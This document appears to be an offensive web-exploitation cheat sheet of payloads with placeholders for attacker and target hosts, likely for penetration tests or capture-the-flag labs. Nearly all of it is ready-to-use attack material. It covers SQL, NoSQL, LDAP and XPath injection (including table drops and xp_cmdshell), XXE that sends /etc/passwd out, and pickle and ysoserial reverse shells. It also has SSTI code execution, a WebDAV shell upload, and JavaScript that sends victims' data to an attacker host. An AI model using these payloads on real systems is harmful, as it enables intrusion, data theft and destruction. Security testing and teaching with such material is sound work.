# Web Vulnerabilities

## SQL Injection Advanced

```sql
-- Union-based enumeration
' UNION SELECT NULL,NULL,NULL-- 
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- 
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- 
' UNION SELECT username,password,NULL FROM users-- 

-- Boolean-based blind
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- 
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>100-- 

-- Time-based blind
' AND IF(1=1,SLEEP(5),0)-- 
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '00:00:05'-- 

-- Error-based
' AND 1=CONVERT(int,(SELECT @@version))-- 
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- 

-- Stacked queries
'; DROP TABLE users-- 
'; EXEC xp_cmdshell('whoami')-- 

-- Second-order injection
# Register user with payload in username
username: admin'-- 
# Payload executes when username is used in another query

-- WAF bypass
' /*!50000UNION*/ SELECT-- 
' %55NION %53ELECT-- 
' UN/**/ION SE/**/LECT-- 
'/**/OR/**/1=1-- 
```

## NoSQL Injection

```javascript
// MongoDB
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}

// Authentication bypass
username[$ne]=invalid&password[$ne]=invalid
{"username": {"$nin": [""]}, "password": {"$nin": [""]}}

// JavaScript injection
{"$where": "this.username == 'admin' || '1'=='1'"}

// Operator injection
{"username": "admin", "password": {"$regex": "^a"}}  // Test first char

// Blind NoSQL
# Iterate through password characters
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ad"}}
{"username": "admin", "password": {"$regex": "^adm"}}
```

## LDAP Injection

```bash
# Authentication bypass
*
*)(&
*)(|(&
admin)(&

# Extract data
*))(|(objectClass=*
*)(userPassword=*)(&

# Blind LDAP
(cn=admin)(userPassword=a*)  # Test first char
```

## XPath Injection

```xpath
' or '1'='1
' or 1=1 or 'a'='a
') or '1'='1
') or 1=1 or ('a'='a

# Extract data
' and count(//user)=1 or ''='
' and string-length(//user[1]/password)>5 or ''='
' and substring(//user[1]/password,1,1)='a' or ''='
```

## XML Injection

```xml
<!-- Entity expansion (Billion laughs) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>

<!-- XXE with parameter entities -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{{lhost}}/evil.dtd">
  %xxe;
]>
<root>&evil;</root>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; evil SYSTEM 'http://{{lhost}}/?x=%file;'>">
%eval;
%evil;
```

## JWT Attacks

```bash
# None algorithm
# Change alg to "none" and remove signature
{"alg":"none","typ":"JWT"}

# Weak secret brute force
hashcat -m 16500 jwt.txt rockyou.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# Key confusion (RS256 to HS256)
# Use public key as HMAC secret

# JKU header injection
{"alg":"RS256","jku":"http://{{lhost}}/jwks.json"}

# Kid header injection
{"alg":"HS256","kid":"../../dev/null"}
{"alg":"HS256","kid":"| whoami"}
```

## GraphQL Injection

```graphql
# Introspection query
{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}

# Query all users
{users{id,username,password,email}}

# Mutations
mutation {
  updateUser(id: 1, role: "admin") {
    id
    role
  }
}

# Batch attacks
[
  {"query": "query{user(id:1){password}}"},
  {"query": "query{user(id:2){password}}"},
  {"query": "query{user(id:3){password}}"}
]

# Alias to bypass rate limiting
{
  user1: user(id: 1) {password}
  user2: user(id: 2) {password}
  user3: user(id: 3) {password}
}
```

## CRLF Injection

```bash
# HTTP Response Splitting
http://{{machine_ip}}/redirect?url=http://evil.com%0d%0aSet-Cookie:%20session=admin

# Header injection
User-Agent: Mozilla%0d%0aX-Injected: true

# Log poisoning
GET /app?param=value%0d%0a[ADMIN]%20User%20logged%20in HTTP/1.1
```

## Host Header Injection

```http
GET / HTTP/1.1
Host: {{machine_ip}}
X-Forwarded-Host: evil.com

# Password reset poisoning
Host: evil.com

# Web cache poisoning
Host: evil.com
X-Forwarded-Host: evil.com

# SSRF via Host header
Host: 127.0.0.1
Host: localhost
Host: 169.254.169.254
```

## HTTP Request Smuggling

```http
# CL.TE
POST / HTTP/1.1
Host: {{machine_ip}}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL
POST / HTTP/1.1
Host: {{machine_ip}}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE
POST / HTTP/1.1
Host: {{machine_ip}}
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

SMUGGLED
```

## Insecure Deserialization

```python
# Python pickle
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('nc {{lhost}} {{lport}} -e /bin/bash',))

payload = pickle.dumps(Exploit())
print(payload.hex())

# PHP serialize
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# Java deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1' | base64
```

## Web Cache Poisoning

```http
# Unkeyed headers
GET / HTTP/1.1
Host: {{machine_ip}}
X-Forwarded-Host: evil.com
X-Forwarded-Proto: https
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Cache key manipulation
GET /?cb=123 HTTP/1.1
Host: {{machine_ip}}
X-Forwarded-Host: evil.com

# Fat GET
GET /?excluded=1 HTTP/1.1
Host: {{machine_ip}}
Content-Length: 44

GET /admin HTTP/1.1
Host: {{machine_ip}}
```

## OAuth/OIDC Attacks

```bash
# Account hijacking via redirect_uri
redirect_uri=https://evil.com

# State parameter missing
# No state validation = CSRF

# Authorization code interception
# Steal code parameter from callback

# Scope abuse
scope=openid profile email admin

# JWT attacks on ID token
# See JWT section
```

## WebSocket Attacks

```javascript
// CSWSH (Cross-Site WebSocket Hijacking)
var ws = new WebSocket('ws://{{machine_ip}}/socket');
ws.onmessage = function(msg) {
    fetch('http://{{lhost}}/?data=' + msg.data);
};

// Message manipulation
ws.send('{"action":"admin","param":"value"}');

// Blind injection
ws.send('{"search":"\\' OR 1=1--"}');
```

## Server-Side Template Injection (SSTI)

```python
# Jinja2 detection
{{7*7}}  # 49
{{7*'7'}}  # 7777777

# RCE
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity (Java)
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")

# Tornado (Python)
{% import os %}{{os.system('id')}}

# Smarty (PHP)
{system('id')}
{php}echo `id`;{/php}
```

## API Security

```bash
# Mass assignment
POST /api/users
{"username":"hacker","password":"pass","role":"admin"}

# BOLA/IDOR
GET /api/users/{{user_id}}
GET /api/orders/{{order_id}}

# Excessive data exposure
GET /api/users/me  # Returns all user data including sensitive fields

# Rate limiting bypass
X-Forwarded-For: {{random_ip}}
X-Originating-IP: {{random_ip}}
X-Remote-IP: {{random_ip}}
X-Client-IP: {{random_ip}}

# API versioning
/api/v1/admin  # Maybe deprecated and vulnerable
/api/v2/admin  # Current version
```

## WebDAV Exploitation

```bash
# Test methods
curl -X OPTIONS http://{{machine_ip}}/webdav/ -H "Authorization: Basic {{base64_creds}}"

# Upload shell
curl -X PUT http://{{machine_ip}}/webdav/shell.php -d @shell.php -H "Authorization: Basic {{base64_creds}}"

# davtest
davtest -url http://{{machine_ip}}/webdav/ -auth {{user}}:{{pass}}

# cadaver
cadaver http://{{machine_ip}}/webdav/
put shell.php
```

## HTTP Parameter Pollution

```bash
# Multiple parameters
?id=1&id=2
?email=user@victim.com&email=attacker@evil.com

# Array injection
?user[]=admin&user[]=victim

# JSON parameter pollution
{"email":"user@victim.com","email":"attacker@evil.com"}
```

## Race Conditions

```python
import requests
import threading

def exploit():
    data = {"amount": 1000, "recipient": "attacker"}
    requests.post('http://{{machine_ip}}/transfer', data=data, cookies={"session": "{{session}}"})

# Execute simultaneously
threads = []
for i in range(20):
    t = threading.Thread(target=exploit)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

## CORS Misconfiguration

```html
<!-- Steal sensitive data -->
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    fetch('http://{{lhost}}/?data=' + btoa(this.responseText));
};
req.open('GET', 'http://{{machine_ip}}/api/sensitive', true);
req.withCredentials = true;
req.send();
</script>
```